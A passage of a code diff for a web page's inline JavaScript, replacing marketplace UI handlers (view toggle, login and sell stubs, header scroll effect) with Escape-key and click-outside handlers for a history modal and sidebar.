-            document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
-        }
-
-        function changeView(view) {
-            const grid = document.getElementById('productsGrid');
-            if (view === 'list') {
-                grid.style.gridTemplateColumns = '1fr';
-            } else {
-                grid.style.gridTemplateColumns = 'repeat(auto-fill, minmax(280px, 1fr))';
-            }
-        }
-
-        function openSellModal() {
-            showToast('Abriendo formulario de venta...');
-            // Aquí iría la lógica para abrir el modal de venta
-        }
-
-        function openLogin() {
-            showToast('Abriendo login...');
-        }
-
-        // Close modal on outside click
-        document.getElementById('productModal').addEventListener('click', (e) => {
-            if (e.target.id === 'productModal') {
-                closeModal();
+        
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeHistoryModal();
+                closeSidebar();
             }
         });
+        
+        const historyModal = document.getElementById('history-modal');
+        if (historyModal) {
+            historyModal.addEventListener('click', (e) => {
+                if (e.target === historyModal) {
+                    closeHistoryModal();
+                }
+            });
+        }
+    }
 
-        // Header scroll effect
-        window.addEventListener('scroll', () => {
-            const header = document.querySelector('header');
-            if (window.scrollY > 50) {
-                header.style.boxShadow = '0 4px 20px rgba(0,0,0,0.1)';
-            } else {
-                header.style.boxShadow = 'none';
-            }
-        });
-    </script>
+    document.addEventListener('DOMContentLoaded', init);
+</script>
 </body>
 </html>
